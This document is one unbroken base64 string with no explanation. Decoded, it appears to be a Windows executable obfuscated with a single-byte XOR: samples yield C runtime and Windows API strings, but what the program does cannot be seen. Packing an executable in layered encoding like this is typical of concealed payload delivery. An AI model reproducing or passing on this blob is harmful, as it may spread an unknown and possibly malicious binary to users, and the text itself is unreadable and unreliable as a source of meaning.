xcXXXZ5YnZlbhdTcnQXWXhhF1h0YxdEcmcXVmJwF11iexddYnkXWnZuF1ZnZRdadmUXUXJ1F112eRdEdmNiZXN2bhcXFxdRZX5zdm4XF0N/YmVkc3ZuFxcXF0Byc3lyZHN2bhcXF0NicmRzdm4XWnh5c3ZuFxdEYnlzdm4XF0R2YxdRZX4XQ39iF0BycxdDYnIXWnh5F0RieRcXFxcXFhUUExIREB8eHRwbGhkYBwYFBAMCAQAPDg0MCwoJCDc2NTQzMjEwPz49PDs6OTgnJiUkIyIhIC8uLSwrKikoV1ZVVFNSUVBfXl1cW1pZWEdGRURDQkFAT05NTEtKSUh3dnV0c3JxcH9+fXx7enl4Z2ZlZGNiYWBvbm1sa2ppaBcqFxcXVHhlUm9+Y0dleHRyZGQXF3oXZBd0F3gXZRdyF3IXORdzF3sXexcXFxcXFxcSFxfXHBcXFxcXFxcKFxfXExcXFxcXFxeBFxfXExcXFxcXFxeaFxfXHxcXFxcXFxeZFxfXHxcXFxcXFxeYFxfXHxcXFxcXFxeHFxfXHxcXFxcXFxeGFxfXHxcXFxcXFxeFFxfXHxcXFxcXFxeEFxfXHxcXFxcXFxejFRfXHxcXFxcXFxeiFRfXHxcXFxcXFxcUFxcXHhcXF4cXFxcbFxcXZRdiF3kXYxd+F3oXchc3F3IXZRdlF3gXZRc3FxcXFxcaFx0XFxcXF0MXWxdYF0QXRBc3F3IXZRdlF3gXZRcaFx0XFxdEF14XWRdQFzcXchdlF2UXeBdlFxoXHRcXFxcXUxdYF1oXVhdeF1kXNxdyF2UXZRd4F2UXGhcdFxcXFxdFFyEXJxckFyQXGhcdFzoXNxdWF2MXYxdyF3oXZxdjFzcXYxd4FzcXYhdkF3IXNxdaF0QXXhdbFzcXdBd4F3MXchc3F3EXZRd4F3oXNxdjF38XfhdkFzcXdhdkF2QXchd6F3UXexduFzcXcxdiF2UXfhd5F3AXNxd5F3YXYxd+F2EXchc3F3QXeBdzF3IXNxd+F3kXfhdjF34Xdhd7F34XbRd2F2MXfhd4F3kXHRdDF38XfhdkFzcXfhd5F3MXfhd0F3YXYxdyF2QXNxd2FzcXdRdiF3AXNxd+F3kXNxduF3gXYhdlFzcXdhdnF2cXexd+F3QXdhdjF34XeBd5FzkXNxdeF2MXNxd+F2QXNxd6F3gXZBdjFzcXexd+F3wXchd7F24XNxdjF38Xchc3F2UXchdkF2IXexdjFzcXeBdxFzcXdBd2F3sXexd+F3kXcBc3F3YXeRc3F1oXRBdeF1sXOhd0F3gXehdnF34XexdyF3MXNxc/FzgXdBd7F2UXPhc3F3EXYhd5F3QXYxd+F3gXeRc3F3EXZRd4F3oXNxd2FzcXeRd2F2MXfhdhF3IXNxd0F3gXeRdkF2MXZRdiF3QXYxd4F2UXNxd4F2UXNxdxF2UXeBd6FzcXUxd7F3sXWhd2F34XeRc5FxoXHRcXFxcXRRchFycXJBclFxoXHRc6FzcXeRd4F2MXNxdyF3kXeBdiF3AXfxc3F2QXZxd2F3QXchc3F3EXeBdlFzcXexd4F3QXdhd7F3IXNxd+F3kXcRd4F2UXehd2F2MXfhd4F3kXGhcdFxcXFxdFFyEXJxckFyYXGhcdFzoXNxdWF2MXYxdyF3oXZxdjFzcXYxd4FzcXfhd5F34XYxd+F3YXexd+F20Xchc3F2MXfxdyFzcXVBdFF0MXNxd6F3gXZRdyFzcXYxd/F3YXeRc3F3gXeRd0F3IXORcdF0MXfxd+F2QXNxd+F3kXcxd+F3QXdhdjF3IXZBc3F3YXNxd1F2IXcBc3F34XeRc3F24XeBdiF2UXNxd2F2cXZxd7F34XdBd2F2MXfhd4F3kXORcaFx0XFxcXF0UXIRcnFyQXJxcaFx0XOhc3F1QXRRdDFzcXeRd4F2MXNxd+F3kXfhdjF34Xdhd7F34XbRdyF3MXGhcdFxcXFxdFFyEXJxclFy8XGhcdFzoXNxdiF3kXdhd1F3sXchc3F2MXeBc3F34XeRd+F2MXfhd2F3sXfhdtF3IXNxd/F3IXdhdnFxoXHRcXFxcXFxcXF0UXIRcnFyUXIBcaFx0XOhc3F3kXeBdjFzcXchd5F3gXYhdwF38XNxdkF2cXdhd0F3IXNxdxF3gXZRc3F3sXeBdgF34XeBc3F34XeRd+F2MXfhd2F3sXfhdtF3YXYxd+F3gXeRcaFx0XFxcXFxcXFxdFFyEXJxclFyEXGhcdFzoXNxd5F3gXYxc3F3IXeRd4F2IXcBd/FzcXZBdnF3YXdBdyFzcXcRd4F2UXNxdkF2MXcxd+F3gXNxd+F3kXfhdjF34Xdhd7F34XbRd2F2MXfhd4F3kXGhcdFxcXFxcXFxcXRRchFycXJRciFxoXHRc6FzcXZxdiF2UXchc3F2EXfhdlF2MXYhd2F3sXNxdxF2IXeRd0F2MXfhd4F3kXNxd0F3YXexd7FxoXHRcXFxcXFxdFFyEXJxclFyMXGhcdFzoXNxd5F3gXYxc3F3IXeRd4F2IXcBd/FzcXZBdnF3YXdBdyFzcXcRd4F2UXNxdIF3gXeRdyF28XfhdjFzgXdhdjF3IXbxd+F2MXNxdjF3YXdRd7F3IXGhcdFxcXFxcXFxcXRRchFycXJhcuFxoXHRc6FzcXYhd5F3YXdRd7F3IXNxdjF3gXNxd4F2cXchd5FzcXdBd4F3kXZBd4F3sXchc3F3MXchdhF34XdBdyFxoXHRcXFxcXFxcXF0UXIRcnFyYXLxcaFx0XOhc3F2IXeRdyF28XZxdyF3QXYxdyF3MXNxd/F3IXdhdnFzcXchdlF2UXeBdlFxoXHRcXFxcXFxcXF0UXIRcnFyYXIBcaFx0XOhc3F2IXeRdyF28XZxdyF3QXYxdyF3MXNxd6F2IXexdjF34XYxd/F2UXchd2F3MXNxd7F3gXdBd8FzcXchdlF2UXeBdlFxoXHRcXFxcXFxcXF0UXIRcnFyYXIRcaFx0XOhc3F3kXeBdjFzcXchd5F3gXYhdwF38XNxdkF2cXdhd0F3IXNxdxF3gXZRc3F2MXfxdlF3IXdhdzFzcXcxd2F2MXdhcaFx0XFxdFFyEXJxcmFycXGhcdFzoXNxd2F3UXeBdlF2MXPxc+FzcXfxd2F2QXNxd1F3IXchd5FzcXdBd2F3sXexdyF3MXGhcdFxcXFxdFFyEXJxcnFy4XGhcdFzoXNxd5F3gXYxc3F3IXeRd4F2IXcBd/FzcXZBdnF3YXdBdyFzcXcRd4F2UXNxdyF3kXYRd+F2UXeBd5F3oXchd5F2MXGhcdFxcXRRchFycXJxcvFxoXHRc6FzcXeRd4F2MXNxdyF3kXeBdiF3AXfxc3F2QXZxd2F3QXchc3F3EXeBdlFzcXdhdlF3AXYhd6F3IXeRdjF2QXGhcdFxcXFxcXF0UXIRcnFycXJRcaFx0XOhc3F3EXexd4F3YXYxd+F3kXcBc3F2cXeBd+F3kXYxc3F2QXYhdnF2cXeBdlF2MXNxd5F3gXYxc3F3sXeBd2F3MXchdzFxoXHRcXFxcXFxcXFxUXFxdXXhYHHxcXF/9fFgceFxcXh18WBx0XFxdfXxYHBxcXF+dQFgcGFxcXh1AWBwUXFxdfUBYHBBcXF+dRFgcPFxcXl1EWBw4XFxcnURYHDRcXF9dSFgcMFxcXR1IWBwsXFxcXUhYHCRcXF9dTFgcIFxcX71QWBzcXFxeHVBYHNhcXF7dWFgdvFxcXl1YWB24XFxdzVhYHbRcXF19WFgfrFxcXV1YWB+gXFxc3VhYHWhd+F3QXZRd4F2QXeBdxF2MXNxdBF34XZBdiF3YXexc3F1QXPBc8FzcXRRdiF3kXYxd+F3oXchc3F1sXfhd1F2UXdhdlF24XFxcXFx0XHRcXFxcXORc5FzkXFxcrF2cXZRd4F3AXZRd2F3oXNxd5F3YXehdyFzcXYhd5F3wXeRd4F2AXeRcpFxcXFxdFF2IXeRdjF34XehdyFzcXUhdlF2UXeBdlFzYXHRcdF0cXZRd4F3AXZRd2F3oXLRc3FxcXN1R4emd7cmNyN1h1fXJ0YzdbeHR2Y3hlMBcXFzdUe3ZkZDdffnJldmV0f243U3JkdGV+Z2N4ZTAXFxcXN1V2ZHI3VHt2ZGQ3VmVldm4wFxc3VXZkcjdUe3ZkZDdTcmR0ZX5nY3hlN3ZjNz8XN0NuZ3I3U3JkdGV+Z2N4ZTAXFxd3e3h0dns3ZGN2Y350N2N/ZXJ2czdwYnZlczAXd3p2eXZwcnM3YXJ0Y3hlN3R4Z243dHh5ZGNlYnRjeGU3fmNyZXZjeGUwFxd3YXJ0Y3hlN2F1dmRyN3R4Z243dHh5ZGNlYnRjeGU3fmNyZXZjeGUwFxcXF3dhcnRjeGU3dHhnbjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXF3dzbnl2en50N3Zjcm9+YzdzcmRjZWJ0Y3hlN3F4ZTcwFxcXF3dzbnl2en50N355fmN+dnt+bXJlN3F4ZTcwFxd3cn83YXJ0Y3hlN2F1dmRyN3R4Z243dHh5ZGNlYnRjeGU3fmNyZXZjeGUwF3dyfzdhcnRjeGU3dHhnbjd0eHlkY2VidGN4ZTd+Y3JldmN4ZTAXFxd3enZ5dnByczdhcnRjeGU3c3JkY2VidGN4ZTd+Y3JldmN4ZTAXFxcXd3p2eXZwcnM3YXJ0Y3hlN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBcXF3dne3Z0cnpyeWM3c3J7cmNyTEo3dHt4ZGJlcjAXFxcXd2d7dnRyenJ5YzdzcntyY3I3dHt4ZGJlcjAXF3d4enl+N3R2e3tkfnAwFxc3c3J7cmNyTEoXFxc3eXJgTEoXF3d7eHR2ezdhcWN2dXtyN3R4eWRjZWJ0Y3hlN3R7eGRiZXIwF3d7eHR2ezdhcWN2dXtyMBd3RUNDXhcXF3dSXxd3YnNjN2VyY2JleX55cDAXd3R4Z243dHh5ZGNlYnRjeGU3dHt4ZGJlcjAXF3dyfzdhcnRjeGU3YXV2ZHI3dHh5ZGNlYnRjeGU3fmNyZXZjeGUwFxd3cn83YXJ0Y3hlN3NyZGNlYnRjeGU3fmNyZXZjeGUwF3dyfzdhcnRjeGU3dHh5ZGNlYnRjeGU3fmNyZXZjeGUwFxcXF3dhfmVjYnZ7N3N+ZGd7dnRyenJ5Yzd6dmcwFxd3YXJ0Y3hlN2F1dmRyN3R4eWRjZWJ0Y3hlN35jcmV2Y3hlMBd3YXJ0Y3hlN3NyZGNlYnRjeGU3fmNyZXZjeGUwFxcXF3dhcnRjeGU3dHh5ZGNlYnRjeGU3fmNyZXZjeGUwFxcXd2R0dnt2ZTdzcntyY355cDdzcmRjZWJ0Y3hlMBcXFxd3c3JxdmJ7Yzd0eHlkY2VidGN4ZTd0e3hkYmVyMBcXF3dhcnRjeGU3c3J7cmN+eXA3c3JkY2VidGN4ZTAXFxcXd2F1dmRyN3NyZGNlYnRjeGUwFxd3ZGNlfnlwMBcXFxd3e3h0dns3ZGN2Y350N3BidmVzMBcXFxd3Y25ncnhxMBcXFxd3YXR2e3swF3dhdWN2dXtyMBcXF3dhcWN2dXtyMBcXF0kqFxdrKhcXMSoXFysrKhcpKSoXMioXFzgqFxc6KhcXPCoXFz0qFxdraxcXMTEXF2sXFxdJFxcXaRcXFz8+Fxc7FxcXKSoXFykXFxcrKhcXKxcXFzIXFxc6KT0XMRcXFzwXFxc6FxcXOjoXFzw8Fxc9FxcXOikXF3hncmV2Y3hlFxcXF0xKFxc2KhcXKioXFzYXFxcrKxcXKSkXFzdzcntyY3IXN3lyYBcXFxdISGJ5dnt+cHlycxdISGVyZGNlfnRjFxdISGdjZSEjF0hIcnZ1fhcXSEh0e2V0dnt7FxcXSEhxdmRjdHZ7excXSEhjf35kdHZ7excXSEhkY3N0dnt7FxcXSEhndmR0dnsXFxcXSEh0c3J0exdISHV2ZHJzPxcXFxcXFxcXt0cWB49HFgebRxYHl0cWB2NHFgd/RxYHS0cWB0NHFgdbRxYHV0cWByNHFgeSIxYHO0cWBzNHFgdHVxYHN0cWBwtHFgcPRxYHA0cWBwdHFgcbRxYHF0cWB+tYFgfvWBYH41gWB+dYFgf7WBYH/1gWB/NYFgf3WBYHHyQWB8tYFgfPWBYHw1gWB8dYFgfbWBYH31gWB9NYFgfXWBYHq1gWB69YFgejWBYHp1gWB7tYFge/WBYHs1gWB7dYFgeLWBYHj1gWB4NYFgeHWBYHm1gWB59YFgdrWBYHZ1gWB39YFgdLWBYHU1gWBy9YFgczWBYHE1gWB/NZFgfTWRYHs1kWB5NZFgd3WRYHU1kWBzdZFgcXWRYHz1oWB6taFge7WhYHv1oWB7daFgeHWhYHe1oWB3NaFgdPWhYHX1oWBztaFgcbWhYH81sWB6tbFgeDWxYHf1sWB1tbFgc/WxYHE1sWB89cFge7XBYHh1wWB5IjFgdrXBYHd1wWB1tcFgc7XBYHB1wWBxcXFxcRl5eRl5aXFxcHFJGXkZWXAxISUlJSkpKSEhcXJyeXR5efFx8XPzAvR0CXFxAXICcnR0efFxcXNz+Xn5eXFxcXd393f39/Hx8Qb2dnYGdnHx8XFx8XHxcQHxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXNxc3FzcXNxc3FzcXNxc3FzcXPxc/Fz8XPxc/FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3F18XBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXkxeTF5MXkxeTF5MXkxeTF5MXkxcHFwcXBxcHFwcXBxcHF5YXlheWF5YXlheWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcWFxYXFhcHFwcXBxcHFwcXBxeVF5UXlReVF5UXlRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXFRcVFxUXBxcHFwcXBxc3FxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFzcXNxc3FzcXNxc3FzcXNxc3F38XPxc/Fz8XPxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxdfFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHF5MXkxeTF5MXkxeTF5MXkxeTF5MXBxcHFwcXBxcHFwcXBxeWFpYWlhaWFpYWlhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWBxcHFwcXBxcHFwcXlRaVFpUWlRaVFpUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFgcXBxcHFwcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXNxc3FzcXXxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXBxcHFwcXAxcDFwcXBxcHFwcXBxcDFwcXBxcHFwcXBxcHFxYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYHFxYWFhYWFhYWFhYWFhYWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWFRYVFhUWBxcVFhUWFRYVFhUWFRYVFhUWFhYXFxcXl5aVlJOSkZCfnp2cm5qZmIeGhYSDgoGAj46NjIuKiYi3trW0s7KxsL++vby7urm4p6alpKOioaCvrq2sq6qpqNfW1dTT0tHQ397d3Nva2djHxsXEw8LBwM/OzczLysnI9/b19PPy8fD//v38+/r5+Ofm5eTj4uHg7+7t7Ovq6egXFhUUExIREB8eHRwbGhkYBwYFBAMCAQAPDg0MCwoJCDc2NTQzMjEwPz49PDs6OTgnJiUkIyIhIC8uLSwrKikoV3Z1dHNycXB/fn18e3p5eGdmZWRjYmFgb25tTEtKSUh3dnV0c3JxcH9+fXx7enl4Z2ZlZGNiYWBvbm1sa2ppaJeWlZSTkpGQn56dnJuamZiHhoWEg4KBgI+OjYyLiomIt7a1tLOysbC/vr28u7q5uKempaSjoqGgr66trKuqqajX1tXU09LR0N/e3dzb2tnYx8bFxMPCwcDPzs3My8rJyPf29fTz8vHw//79/Pv6+fjn5uXk4+Lh4O/u7ezr6unol5aVlJOSkZCfnp2cm5qZmIeGhYSDgoGAj46NjIuKiYi3trW0s7KxsL++vby7urm4p6alpKOioaCvrq2sq6qpqNfW1dTT0tHQ397d3Nva2djHxsXEw8LBwM/OzczLysnI9/b19PPy8fD//v38+/r5+Ofm5eTj4uHg7+7t7Ovq6egXFhUUExIREB8eHRwbGhkYBwYFBAMCAQAPDg0MCwoJCDc2NTQzMjEwPz49PDs6OTgnJiUkIyIhIC8uLSwrKikoV1ZVVFNSUVBfXl1cW1pZWEdGRURDQkFAT05NTEtKSUh3VlVUU1JRUF9eXVxbWllYR0ZFRENCQUBPTk1sa2ppaJeWlZSTkpGQn56dnJuamZiHhoWEg4KBgI+OjYyLiomIt7a1tLOysbC/vr28u7q5uKempaSjoqGgr66trKuqqajX1tXU09LR0N/e3dzb2tnYx8bFxMPCwcDPzs3My8rJyPf29fTz8vHw//79/Pv6+fjn5uXk4+Lh4O/u7ezr6unoUHJjR2V4dHJkZEB+eXN4YERjdmN+eHkXUHJjQmRyZVh1fXJ0Y155cXhlenZjfnh5QBcXF1ByY1t2ZGNWdGN+YXJHeGdiZxcXUHJjVnRjfmFyQH55c3hgF1pyZGR2cHJVeG9AF0IXRBdSF0UXJBclFzkXUxdbF1sXFxcXF1QXWBdZF1gXQhdDFzMXFxcXFxcXXxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXx5UWB/dKFgcBFxcXFxcXFxcXFxcXFxcX45YWB5tMFgcXFxcXFxcXFxUXFxeLTBYHv0wWB9NMFgcXFxcX45YWBxYXFxcXFxcX6Ojo6BcXFxdXFxcXm0wWBweVFgcXFxcXFxcXF+jo6OgXFxcXVxcXF/dMFgcXFxcXFxcXFxYXFxfnTBYH00wWBxcXFxcXFxcXFxcXFxcXFxc7lRYHG0sWBxcXFxcXFxcXFhcXFwtLFgczSxYHFxcXFzuVFgcXFxcXFxcXF+jo6OgXFxcXVxcXFxtLFgcXFxcXFxcXFxcXFxdflRYHQ0sWBxcXFxcXFxcXFRcXF3NLFgdnSxYH00wWBxcXFxdflRYHFhcXFxcXFxfo6OjoFxcXF1cXFxdDSxYHFxcXFxcXFxcXFxcXf5UWB7dLFgcXFxcXFxcXFxQXFxenSxYH10sWB2dLFgfTTBYHFxcXF3+VFgcVFxcXFxcXF+jo6OgXFxcXVxcXF7dLFgcXFxcXFxcXFxcXFxeflRYH50sWBxcXFxcXFxcXFBcXFxdKFgcHShYHZ0sWB9NMFgcXFxcXn5UWBxUXFxcXFxcX6Ojo6BcXFxdXFxcX50sWBxcXFxcXFxcXFxcXFweVFgf3TBYHFxcXFxcXFxcXFxcXp5UWB0NKFgcXFxcXFxcXFxYXFxdzShYHe0oWBxcXFxenlRYHFxcXFxcXFxfo6OjoFxcXF1cXFxdDShYHFxcXFxcXFxcXFxcXN5AWB4tKFgcXFxcXFxcXFxUXFxe7ShYHr0oWB9NMFgcXFxcXN5AWBxYXFxcXFxcX6Ojo6BcXFxdXFxcXi0oWBxcXFxcXFxcXFxcXF9ZhFxfcYBcX54YXF/ewFxcnFRYX1w0WFxYMFhdXDBYXZwwWF74MFhf+DBYXogsWF+8LFhcvChYXlwoWF8YKFhc+CRYX9wkWFykIFheXCBYXxggWF+4IFhcXFxcXFxcXFxcXFxcXFxcXFxcXFxcHFwcXFxcXT0kWBxUXFxdzSRYHl0kWBxcXFxfjlhYHFxcXF+jo6OgXFxcXGxcXF9czFwcXFxcXB5UWBxcXFxfo6OjoFxcXFxsXFxdKchcHVxcXFxcXFxcXFxcXdDsXB1cXFxcXFxcXFxcXF/w7Fwfo6OjoFxcXF+jo6OgXFxcXFhcXFxcXFxcWFxcXFxcXFzUShA4TFxcXq0kWBxUXFxcXSBYHFxcXFxcXFxcXFxcXFhcXFxUXFxcVFxcXFBcXFxYXFxe7SRYHFxcXFxcXFxcUFxcXFhcXF4tJFgfo6Ojo9w0WBxcXFxf8DRYHFhcXF+ENFgc1EoQOFBcXFz9IFgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoJwwWBxcXFxcvDBYHNRKEDhUXFxdzSBYHFxcXFxcXFxcXFxcXFxcXFxcXFxcWFxcX6Ojo6HcMFgcXFxcXfwwWBzUShA4VFxcXj0gWBxcXFxcXFxcXFxcXFxcXFxcXFxcXFhcXF+jo6OiHDBYHNRKEDhYXFxfbSBYHFxcXFxcXFxcXFxcXFxcXFxcXFxcWFxcX6Ojo6McMFgc1EoQOFhcXF+9IFgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxc1EoQOGBcXF193FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoBwsWBxcXFxcMCxYHFhcXFzELFgfo6OjoJgsWBxQXFxcrCxYHExcXF1ALFgfo6OjoRQsWBxEXFxdKCxYHEBcXF38LFgcfFxcXZAsWBxEXFxdpCxYH6Ojo6J4LFgccFxcXgwsWBxsXFxeICxYHGhcXF70LFgfo6Ojo9wsWBxcXFxf/CxYHFhcXF+cLFgc1EoQOFBcXF9d3FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoNwoWBxcXFxc/ChYHFhcXFycKFgc1EoQOFBcXF+t3FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjodwoWBxcXFxd/ChYHFhcXF2cKFgcWFxcXbwoWBzUShA4TFxcXL3YWBxcXFxcXFxcXFxcXFxcXFxcXFxcXFhcXF+jo6OivChYHFxcXF6cKFgc1EoQOFRcXF2t2FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoFwkWBxcXFxcOCRYHFxcXFzYJFgc1EoQOFBcXF6d2FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxc1EoQOGxcXFwd1FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoRwkWBxcXFxdMCRYHFhcXF3EJFgcVFxcXZgkWBxQXFxdrCRYHExcXF50JFgcSFxcXjwkWBxEXFxexCRYHEBcXF6MJFgcfFxcX1QkWBx4XFxfHCRYHHhcXF88JFgc1EoQOEhcXF4N1FgcXFxcXFxcXFxcXFxcXFxcXFxcXFxYXFxfo6OjoBwgWBxcXFxcPCBYHFhcXFzcIFgcVFxcXPwgWBxUXFxckCBYH6Ojo6GcIFgcXFxcXbwgWBzUShA4VFxcXq3UWBxcXFxcXFxcXFxcXFxcXFxcXFxcXFhcXF+jo6OinCBYH6Ojo6KwIFgcWFxcX0QgWBzUShA4UFxcX53UWBxcXFxcXFxcXFxcXFxcXFxcXFxcXFhcXFxcXFxdflRYHFxcXF+jo6OgXFxcXGxcXF6N2FwcXFxcXuHYXBxcXFxdPdBYHFBcXF390Fgc7dBYHl0kWBxcXFxd/lRYHFxcXF+jo6OgXFxcXGxcXFxZ1FwcXFxcXuHYXBxcXFxeDdBYHFBcXF7N0Fgc7dBYHl0kWBxcXFxeflRYHFxcXF+jo6OgXFxcXGxcXF1l1Fwfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxeBehcHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXF7R5FwcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcX6mcXBxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxfCYhcHFxcXF+no6OgXFxcXw+jo6BcXFxfp6Ojo/WsXB+lrFwcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXWJcXBxcXFxfp6OjoFxcXF8/o6OgXFxcX6ejo6BcXFxdVkxcHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjotZIXB6SSFwcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXpZAXBxcXFxfp6OjoFxcXF8fo6OgXFxcX6ejo6BcXFxehnBcHFxcXF+no6OgXFxcX2+jo6BcXFxfp6OjoFxcXF46aFwcXFxcXFxcXF3KaFwfp6OjoFxcXF8fo6OgXFxcX6ejo6BcXFxdVsBcHFxcXF+no6OgXFxcXw+jo6BcXFxfp6OjoFxcXFyS5FwcXFxcX6ejo6BcXFxfH6OjoFxcXF+no6OgXFxcXNKcXBxcXFxfyuBcH+LgXB+no6OgXFxcXz+jo6BcXFxfp6Ojo3KcXB8OnFwdXFxcXFxcXFxcXFxe6phcH6Ojo6BcXFxfo6OjoFxcXFxcXFxcXFxcXFhcXFxYXFxe7chYHNRKEDhUXFxerchYHFhcXF9tyFgcXFxcXFxcXFxcXFxcWFxcXFxcXF+no6OgXFxcXo+jo6BcXFxfp6OjoFxcXF/KlFwcXFxcXQqUXB0mlFwfp6OjoFxcXF8Po6OgXFxcX6ejo6NujFwfHoxcHFxcXF+no6OgXFxcXz+jo6BcXFxfp6OjocqIXB36iFwcXFxcXkLkXBxcXFxdrcRYHFRcXF59xFgeXSRYHFxcXFzeQFgcXFxcX6Ojo6BcXFxcbFxcXS60XBxcXFxfp6OjoFxcXF8/o6OgXFxcX6ejo6BcXFxesqxcH6ejo6BcXFxfdqxcH6ejo6BcXFxfP6OjoFxcXF+no6OgXFxcXaqkXB+no6OgXFxcXnqkXB+no6OgXFxcXz+jo6BcXFxfp6OjottcXB7LXFwcXFxcX6ejo6BcXFxfP6OjoFxcXF+no6Ojm1xcH4tcXBxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxcw0xcHFxcXF+no6OgXFxcX2+jo6BcXFxfp6OjoFxcXF+7QFwcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXatwXBxcXFxfp6OjoFxcXF9fo6OgXFxcX6ejo6BcXFxdtxxcHFxcXF+no6OgXFxcXx+jo6BcXFxfp6OjoFxcXF8jNFwcXFxcX6ejo6BcXFxfD6OjoFxcXF+no6OgXFxcXIPIXBxcXFxfp6OjoFxcXF8Po6OgXFxcX6ejo6BcXFxdr8BcHFxcXF+no6OgXFxcX3+jo6BcXFxfp6OjoFxcXF1b+FwcXFxcXFxcXF2r/Fwfp6OjoFxcXF8fo6OgXFxcX6ejo6BcXFxcH5hcHFxcXF+no6OgXFxcXx+jo6BcXFxfp6OjoFxcXF/7mFwcXFxcX6ejo6BcXFxfH6OjoFxcXF+no6OgXFxcXkOUXBxcXFxfp6OjoFxcXF8/o6OgXFxcX6ejo6LzkFwep5BcHFxcXF+no6OgXFxcX2+jo6BcXFxfp6OjoFxcXFz3pFwcXFxcX6ejo6BcXFxfb6OjoFxcXF+no6OgXFxcXuxMWBxcXFxfp6OjoFxcXF9fo6OgXFxcX6ejo6BcXFxdUGRYH534WFxcXFxcXFxcXMXoWFyMnFhdbfBYXFxcXFxcXFxddehYXhyYWF6t+FhcXFxcXFxcXFzF5FhcXJxYXY3wWFxcXFxcXFxcXU3kWF68mFhdDfBYXFxcXFxcXFxfJeRYXjyYWF/9+FhcXFxcXFxcXF+t5Fhc7JxYXU3wWFxcXFxcXFxcXC3gWF58mFhcXFxcXFxcXFxcXFxcXFxcXFxcXF6t6FhcBeRYX73oWF/V6FhfBehYXQXoWF7l6FheNehYXlXoWF316FhcXFxcX/XkWFxcXFxdRexYXQ3sWF2d7FheXexYXhXsWF7V7FhevexYX0XsWF8N7Fhf3exYX5XsWFxd6FhcHehYXPXsWF1NkFhcjZBYXMWQWFwFkFhcPexYXHXsWF+18Fhf/fBYXy3wWF8d8FhfTfBYXp3wWF7V8FheFfBYXnXwWFxNkFhfvZRYX/WUWF2t8FhfBZRYX02UWFz94FhdVeBYXQ3gWF3d4Fhd5eBYXk3gWF4N4FhezeBYXoXgWF8V4FhfxeBYXFWcWFzdnFhcjZxYXU2cWF0tnFhdjZxYXkWcWF4FnFhepZxYX22cWF8lnFhfhZxYXFWYWFwdmFhcJZhYXP2YWF1dmFhdDZhYXc2YWF2tmFhefZhYXhWYWF4lmFhenZhYX0WYWF8FmFhf7ZhYX7WYWFx9lFhcDZRYXPWUWF1dlFhdNZRYXY2UWF5llFhezZRYXo2UWF0NkFhcXFxcXHXgWFxcXFxcjehYXFxcXF5t5FhdZeRYXc3kWF7V5FheheRYXb3kWF995FhcXFxcXI3kWFxcXFxcOFlJvfmNHZXh0cmRkF6UTRHtycmcXFRVQcmNbdmRjUmVleGUXF0UXVHt4ZHJfdnlze3IX1xZQcmNUYmVlcnljR2V4dHJkZBdfFFt4dHZ7UWVychfYFV9ydmdRZXJyFxfcFV9ydmdWe3t4dBddFVByY0dleHRyZGRfcnZnFxeAFEdleHRy